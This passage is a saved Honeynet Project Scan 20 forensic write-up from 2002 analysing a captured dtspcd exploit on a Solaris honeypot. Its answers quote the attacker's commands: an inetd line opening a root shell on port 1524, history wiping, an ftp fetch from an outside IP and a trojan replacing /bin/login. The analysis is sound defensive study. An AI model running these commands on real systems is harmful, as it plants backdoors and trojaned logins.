@@ -1,0 +1,209 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0052)http://project.honeynet.org/scans/scan20/sol/12.html -->
+<HTML><HEAD><TITLE>Honeynet Project Scan 20</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 5.50.4916.2300" name=GENERATOR>
+<META content="C:\Program Files\Microsoft Office\Templates\Normal.dot" 
+name=Template></HEAD>
+<BODY link=#0000ff><B><FONT face=Arial size=5>
+<P align=center>Honeynet Project Scan 20</P></FONT><FONT face=Arial size=4>
+<P align=center>April, 2002</P></B></FONT><FONT face=Arial>
+<P>Submitted by: Joe Lofshult &lt;</FONT><A 
+href="mailto:jlofshult@cox.net"><FONT 
+face=Arial>jlofshult@cox.net</FONT></A><FONT face=Arial>&gt;</P>
+<P>Date: <span GateID="3945" title="Day" style="background:lightGreen;"><span GateID="3960" title="Day" style="background:Blue;">4/20</span></span>/02</P>
+<P>&nbsp;</P><B>
+<P>The Challenge</P></B></FONT><FONT face=Arial size=2>
+<P>On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc was 
+remotely compromised with the </FONT><A 
+href="http://www.cert.org/advisories/CA-2001-31.html"><FONT face=Arial 
+size=2>dtspcd exploit</FONT></A><FONT face=Arial size=2>. What makes this attack 
+interesting is that this is the first time the attack was identified and 
+captured in the wild, resulting a </FONT><A 
+href="http://www.cert.org/advisories/CA-2002-01.html"><FONT face=Arial 
+size=2>CERT advisory</FONT></A><FONT face=Arial size=2>. Using the Snort binary 
+capture of the attack, answer the following questions. The honeypot that is 
+attacked is 172.16.1.102. </P>
+<P>Download:<BR></FONT><A 
+href="http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz"><FONT 
+face=Arial size=2>0108@000-snort.log.tar.gz</FONT></A><FONT face=Arial size=2> 
+MD5 = 612be364f54ca5fcb47cf70e69419175 </P>
+<OL>
+  <LI>What is a NOP slide, and how is this one different from the NOP slide in 
+  the rpc.statd exploit in </FONT><A 
+  href="http://project.honeynet.org/scans/scan10/scan10.txt"><FONT face=Arial 
+  size=2>Scan10</FONT></A><FONT face=Arial size=2>? 
+  <LI>The attack was on 08 Jan, 2002. Would Snort have generated an alert then 
+  for the attack? 
+  <LI>In the exploit code, the command "/bin/sh sh -i" is given, what is its 
+  purpose, and why is 'sh' shown twice? 
+  <LI>The attacker executed a variety of commands on the hacked Solaris box. 
+  Which commands were automated by the exploit, which commands were manual by 
+  the attacker himself? 
+  <LI>What is sun1, and how does it work? 
+  <LI>What did you learn from this exercise? 
+  <LI>How long did this challenge take you? </LI></OL><B>
+<P>Bonus Question:</B><BR>One of the commands executed during the attack is </P>
+<P>echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 
+</P>
+<P>What is the purpose of this command and what does 'BD' stand for? 
+</P></FONT><FONT size=2>
+<P>&nbsp;</P></FONT><B><FONT face=Arial>
+<P>Investigation</P>
+<OL></B></FONT><FONT face=Arial size=2>
+  <LI>I downloaded Snort log file: </FONT><A 
+  href="http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz"><FONT 
+  face=Arial size=2>0108@000-snort.log.tar.gz</FONT></A><FONT face=Arial size=2> 
+  and verified checksum:<BR><BR>$ md5sum 
+  0108@000-snort.log.tar.gz<BR>612be364f54ca5fcb47cf70e69419175 
+  0108@000-snort.log.tar.gz<BR><BR>
+  <LI>I extracted the Snort log file 0108@000-snort.log using:<BR><BR>$ tar zxvf 
+  0108@000-snort.log.tar.gz<BR><BR>
+  <LI>The log file was in tcpdump binary format, so I ran it through Snort to 
+  produce a human-readable trace file:<BR><BR>$ snort –vdr 0108@000-snort.log 
+  &gt; snort_log.txt<BR><BR>
+  <LI>I reviewed the trace file to determine what the sequence of events of the 
+  attack were.<BR>
+  <LI>I retrieved the sun1 binary using Ethereal, by first locating the 
+  "ftp-data" protocol session, and then using the "Tools-&gt;Follow TCP Stream" 
+  option.</LI></OL></FONT><B><FONT face=Arial>
+<P>&nbsp;</P>
+<P>Answers</P>
+<OL></B></FONT><FONT face=Arial size=2>
+  <LI>What is a NOP slide, and how is this one different from the NOP slide in 
+  the rpc.statd exploit in </FONT><A 
+  href="http://project.honeynet.org/scans/scan10/scan10.txt"><FONT face=Arial 
+  size=2>Scan10</FONT></A><FONT face=Arial size=2>? <BR><BR>A NOP slide is a 
+  technique used in buffer overflow exploit code to pad the buffer when the 
+  exact end of the buffer is not known or it is <span GateID="3968" title="NegateHedge" style="background:Green;">not</span> obvious where code execution 
+  <span GateID="3955" title="Hedge" style="background:Red;">might</span> begin. Then if the exploit can set the instruction pointer to point to 
+  any memory location within the NOP instruction padding, the CPU will "slide" 
+  into the executable code.<BR><BR>The rpc.statd exploit in Scan 10 was for a 
+  Linux OS on an x86 system. For the x86 architecture, the NOP code is 1 byte 
+  with the value 0x90. The dtspcd attack was on a Solaris Sparc system, and the 
+  NOP code for the Sparc architecture is 4 bytes long with the value 
+  0x801c4011.<BR><BR>
+  <LI>The attack was on 08 Jan, 2002. Would Snort have generated an alert then 
+  for the attack? <BR><BR>It depends. The version of Snort available on <span GateID="3946" title="Day" style="background:lightBlue;"><span GateID="3961" title="Day" style="background:Magenta;">1/8</span></span>/02 
+  was 1.8.3. The default set of rules that came with 1.8.3 did include a 
+  signature for detecting an attempt to execute shellcode on a Sparc system that 
+  could have detected this attack. It wouldn’t have specifically identified the 
+  attack as the dtspcd exploit, though. However, the shellcode rules file was 
+  commented out in the default snort.conf file, so unless it was uncommented, 
+  Snort would not have detected the attack at all.<BR><BR>
+  <LI>In the exploit code, the command "/bin/sh sh -i" is given, what is its 
+  purpose, and why is 'sh' shown twice? <BR><BR>At this point in the attack the 
+  attacker is creating an inetd configuration file in /tmp/x to create a root 
+  command shell whenever a client connects to port 1524 on the compromised 
+  system. From the inetd.conf man page, the syntax for an inetd configuration 
+  file entry is:<BR><BR></FONT><FONT face="Courier New" size=2>service-name 
+  endpoint-type protocol wait-status uid server-program 
+  server-arguments<BR><BR></FONT><FONT face=Arial size=2>where</FONT><FONT 
+  face="Courier New" size=2><BR><BR></FONT><FONT face=Arial 
+  size=2>server-program is the pathname of the server program to be invoked by 
+  inetd, and<BR>server-arguments is defined as the entire command line 
+  (including argument 0).</FONT><FONT face="Courier New" 
+  size=2><BR><BR></FONT><FONT face=Arial size=2>In this case, "/bin/sh" was the 
+  server-program and "sh -i" were the server arguments, where "sh" is argument 
+  0.<BR><BR>
+  <LI>The attacker executed a variety of commands on the hacked Solaris box. 
+  Which commands were automated by the exploit, which commands were manual by 
+  the attacker himself? <BR><BR>Based on the times at which the commands were 
+  executed and the way that many were combined on a single line, I’d speculate 
+  the breakdown is as follows:<BR><BR><U>Exploit</U><BR>
+  <TABLE cellPadding=2>
+    <TBODY>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:07</FONT></TD>
+      <TD><FONT face="Courier New" size=2>Exploit of dtpscd executes: /bin/ksh 
+        -c echo "ingreslock stream tcp nowait root /bin/sh sh -i" &gt; /tmp/x; 
+        /usr/sbin/inetd -s /tmp/x; sleep 10; /bin/rm -f /tmp/x</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:18</FONT></TD>
+      <TD><FONT face="Courier New" size=2>(Attacker connects to port 1524 to 
+        get a root shell)</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:18</FONT></TD>
+      <TD><FONT face="Courier New" size=2>uname -a; ls -l /core 
+        /var/dt/tmp/DTSPCD.log; 
+        PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin; 
+        export PATH; echo "BD PID(s):" `ps -fed|grep ‘ -s /tmp/x’|grep -v 
+        grep|awk ‘{print $2}’`</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:22</FONT></TD>
+      <TD><FONT face="Courier New" 
+  size=2>w</FONT></TD></TR></TBODY></TABLE><BR><U>Attacker</U><BR>
+  <TABLE cellPadding=2>
+    <TBODY>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:49</FONT></TD>
+      <TD><FONT face="Courier New" size=2>unset HISTFILE</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:49</FONT></TD>
+      <TD><FONT face="Courier New" size=2>cd /tmp</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:49</FONT></TD>
+      <TD><FONT face="Courier New" size=2>mkdir /usr/lib</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:50</FONT></TD>
+      <TD><FONT face="Courier New" size=2>mv /bin/login 
+      /usr/lib/libfl.k</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:46:59</FONT></TD>
+      <TD><FONT face="Courier New" size=2>ftp 64.224.118.115 (to get sun1 
+        binary)</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:47:31</FONT></TD>
+      <TD><FONT face="Courier New" size=2>ls</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:47:37</FONT></TD>
+      <TD><FONT face="Courier New" size=2>chmod 555 sun1</FONT></TD></TR>
+    <TR>
+      <TD vAlign=top><FONT face="Courier New" size=2>09:47:38</FONT></TD>
+      <TD><FONT face="Courier New" size=2>mv sun1 
+    /bin/login</FONT></TD></TR></TBODY></TABLE><BR><BR>
+  <LI>What is sun1, and how does it work? <BR><BR>&gt;From the trace file, it 
+  appears that sun1 is a trojan replacement for /bin/login.<BR><BR>Excerpts from 
+  the trace:<BR><BR></FONT><FONT face="Courier New" size=2>mv /bin/login 
+  /usr/lib/libfl.k<BR>chmod 555 sun1<BR>mv sun1 /bin/login</FONT><FONT 
+  face=Arial size=2><BR><BR>I did <span GateID="3971" title="NegateHedge" style="background:Pink;">not</span> <span GateID="3956" title="Hedge" style="background:lightGreen;">actually</span> execute it on a Sun system 
+  though, so I can’t say definitively how it works. If I were to hazard a guess, 
+  I’d say that it has a hardcoded password in it that if supplied gives a root 
+  shell. If the password is not supplied, it <span GateID="3957" title="Hedge" style="background:lightBlue;">probably</span> then calls the original 
+  login program from /usr/lib/libfl.k. This guess is based partially on looking 
+  at other login trojans, and running strings against sun1.<BR><BR>
+  <LI>What did you learn from this exercise? <BR><BR>I learned quite a bit more 
+  about the details of buffer overflows than I knew before. While I always knew 
+  the basic concepts behind these exploits, this exercise allowed me the 
+  opportunity to research them in more depth. Of particular help were the 
+  following resources:<BR><BR>Aleph One.&nbsp;<U>Smashing the Stack for Fun and 
+  Profit</U>. </FONT><A 
+  href="http://www.phrack.com/show.php?p=49&amp;a=14"><FONT 
+  size=2><span GateID="3950" title="ResolveName" style="background:Blue;"><span GateID="3965" title="ResolveName" style="background:Blue;">http://www.phrack.com/show.php?p=49&amp;a=14</span></span></FONT></A><FONT face=Arial 
+  size=2><BR>jeru.&nbsp;<U>Advanced Evasion of IDS buffer overflow 
+  detection</U>. </FONT><A 
+  href="http://www.chscene.ch/ccc/congress/2000/docu/ids.ppt"><FONT 
+  size=2><span GateID="3951" title="ResolveName" style="background:Green;"><span GateID="3966" title="ResolveName" style="background:Green;">http://www.chscene.ch/ccc/congress/2000/docu/ids.ppt</span></span></FONT></A><FONT 
+  face=Arial size=2><BR><BR>
+  <LI>How long did this challenge take you? <BR><BR>1 hour for initial 
+  investigation<BR>3 hours for buffer overflow research<BR>2 hours for 
+  writeup</LI></OL><B>
+<P>&nbsp;</P>
+<P>Bonus Question:</B><BR>One of the commands executed during the attack is </P>
+<P>echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 
+</P>
+<P>What is the purpose of this command and what does 'BD' stand for? 
+</P></FONT><FONT face=Arial></FONT><FONT face=Arial size=2>
+<P>The first thing the attack program did after successfully exploiting the 
+dtspcd server was create a listening process on port 1524 which would create a 
+root shell upon a network connection from a remote client. The way it did this 
+was by creating an inetd configuration file, /tmp/x, with the following 
+entry:<BR><BR></FONT><FONT face="Courier New" size=2>ingreslock stream tcp 
+nowait root /bin/sh sh –I<BR></P></FONT><FONT face=Arial size=2>
+<P>It then created the listening process by running inetd with /tmp/x as its 
+input file:</P></FONT><FONT face="Courier New" size=2>
+<P>/usr/sbin/inetd –s /tmp/x</P></FONT><FONT face=Arial size=2>
+<P>So, the "echo" command above will display the PID of the inetd process 
+associated with the root command shell back door if it was successfully 
+installed. And, hence, my guess is that BD stands for Back 
+Door.</P></FONT></BODY></HTML>
